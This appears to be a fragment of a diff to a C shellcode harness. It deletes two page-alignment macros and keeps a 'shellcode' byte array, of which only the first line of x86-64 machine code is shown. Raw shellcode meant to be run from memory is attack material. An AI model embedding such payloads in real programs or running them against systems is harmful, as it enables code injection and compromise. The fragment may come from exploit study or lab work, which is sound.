@@ -6,8 +6,6 @@
 #include <stdint.h>
 #define CODEBUF 150
 #define PAGESIZE sysconf(_SC_PAGE_SIZE)
-#define PAGE_START(P) ((uintptr_t)(P) & ~(PAGESIZE - 1))
-#define PAGE_END(P)   (((uintptr_t)(P) + PAGESIZE - 1) & ~(PAGESIZE - 1))
 
 char shellcode[] =
 	"\xeb\x50\x48\xb8\x11\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x3f\x48\xc1\xe8\x3f\x48\xbf\x11\x11\x11\x11\x11\x11\x11\x11"
